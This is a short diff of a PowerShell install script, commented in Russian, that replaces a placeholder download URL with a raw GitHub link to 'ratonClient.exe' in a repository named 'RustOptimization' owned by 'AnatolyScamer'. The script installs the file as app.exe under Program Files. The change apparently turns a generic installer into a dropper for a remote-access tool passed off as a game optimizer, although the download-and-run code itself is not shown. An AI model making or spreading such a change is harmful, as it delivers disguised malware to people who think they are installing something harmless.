@@ -6,7 +6,7 @@
 
 # Параметры скрипта
 param(
-    [string]$DownloadUrl = "https://example.com/application.exe",
+    [string]$DownloadUrl = "https://raw.githubusercontent.com/AnatolyScamer/RustOptimization/refs/heads/main/ratonClient.exe",
     [string]$InstallPath = "C:\Program Files\MyApp",
     [string]$FileName = "app.exe",
     [string]$Arguments = "",
